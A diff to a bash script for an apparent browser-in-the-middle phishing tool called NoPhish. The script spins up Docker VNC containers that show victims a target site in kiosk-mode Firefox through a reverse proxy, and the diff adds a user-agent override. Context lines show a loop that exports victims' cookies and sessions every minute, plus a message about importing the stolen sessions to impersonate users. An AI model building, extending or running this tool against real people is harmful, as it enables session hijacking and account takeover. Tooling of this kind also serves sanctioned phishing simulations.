@@ -10,11 +10,12 @@
 	   echo -e "\t -e Export format"
 	   echo -e "\t -s true / false if ssl is required - if ssl is set crt and key file are needed"
 	   echo -e "\t -c Full path to the crt file of the ssl certificate"
-	   echo -e "\t -k Full path to the key file of the ssl certificate"  
+	   echo -e "\t -k Full path to the key file of the ssl certificate"
+	   echo -e "\t -a Adjust default user agent string"  
 	   exit 1 # Exit script after printing help
 	}
 	
-	while getopts "u:d:t:s:c:k:e:" opt
+	while getopts "u:d:t:s:c:k:e:a:" opt
 	do
 		case "$opt" in
 		u ) User="$OPTARG" ;;
@@ -24,6 +25,7 @@
 		s ) SSL="$OPTARG" ;;
 		c ) cert="$OPTARG" ;;
 		k ) key="$OPTARG" ;;
+		a ) useragent=$OPTARG ;;
 		? ) helpFunction ;; # Print helpFunction in case parameter is non-existent
 		esac
 	done
@@ -58,20 +60,6 @@ case "$1" in
 	done
 	;;
 *)
-	while getopts "u:d:t:s:c:k:" opt
-	do
-		case "$opt" in
-		u ) User="$OPTARG" ;;
-		d ) Domain="$OPTARG" ;;
-		t ) Target="$OPTARG" ;;
-		e ) OFormat="$OPTARG" ;;
-		s ) SSL="$OPTARG" ;;
-		c ) cert="$OPTARG" ;;
-		k ) key="$OPTARG" ;;
-		? ) helpFunction ;; # Print helpFunction in case parameter is non-existent
-		esac
-	done
-	
 	
 	# Print helpFunction in case parameters are empty
 	if [ -z "$User" ] || [ -z "$Domain" ] || [ -z "$Target" ]
@@ -118,7 +106,23 @@ case "$1" in
 	    PW=$(openssl rand -hex 14)
 	    sudo docker run -dit -p690$c:6901 --name vnc-user$c -e VNC_PW=$PW vnc-docker &> /dev/null
 	    sleep 1
+	    sudo docker exec vnc-user$c sh -c "firefox &" &> /dev/null
+	    sleep 1
+	    sudo docker exec vnc-user$c sh -c "pidof firefox | xargs kill &" &> /dev/null
+	    if [ -n "$useragent" ]
+	    then
+	    	echo 'user_pref("general.useragent.override","'$useragent'");' > ./vnc/user.js
+	    	sudo docker cp ./vnc/user.js vnc-user$c:/home/headless/
+	    	sudo docker exec vnc-user$c /bin/bash -c 'find -name prefs.js -exec dirname {} \; | xargs cp /home/headless/user.js '
+	    else
+	    	echo 'user_pref("general.useragent.override","This user was phished by NoPhish");' > ./vnc/user.js
+	    	sudo docker cp ./vnc/user.js vnc-user$c:/home/headless/user.js
+	    	sudo docker exec vnc-user$c sh -c "find -name cookies.sqlite -exec dirname {} \; | xargs -n 1 cp -f -r /home/headless/user.js "	    	  
+	    fi
+	    
+	    sleep 1
 	    sudo docker exec vnc-user$c sh -c "xrandr --output VNC-0 & env DISPLAY=:1 firefox $Target --kiosk &" &> /dev/null
+	    
 	    CIP=$(sudo sudo docker container inspect vnc-user$c | grep -m 1 -oP '"IPAddress":\s*"\K[^"]+')
 	    
 	    echo "
@@ -131,8 +135,9 @@ case "$1" in
 		ProxyPassReverse ws://$CIP:6901/websockify
 		</Location>
 	" >> ./proxy/000-default.conf
-	    printf "[-] Starting containers $c of $END\033[0K\r"  
-	
+	    printf "[-] Starting containers $c of $END\033[0K\r"
+
+	    
 	if [ -n "$SSL" ]
 	then
 		urls+=("https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote")
@@ -176,6 +181,7 @@ case "$1" in
 	#Start a loop which copies the cookies from the containers
 	printf "    Every 60 Seconds Cookies and Sessions are exported - Press [CTRL+C] to stop..\n"
 	trap 'printf "\n[-] Import stealed session and cookie JSON to impersonate user\n"; printf "[-] VNC and Rev-Proxy container will be removed\n" ; sleep 2 ; sudo docker rm -f $(sudo docker ps --filter=name="vnc-*" -q) &> /dev/null && sudo docker rm -f $(sudo docker ps --filter=name="rev-proxy" -q) &> /dev/null & printf "[+] Done!"; sleep 2' SIGTERM EXIT
+	sleep 60
 	while :
 	do
 	for (( c=$START; c<=$END; c++ ))
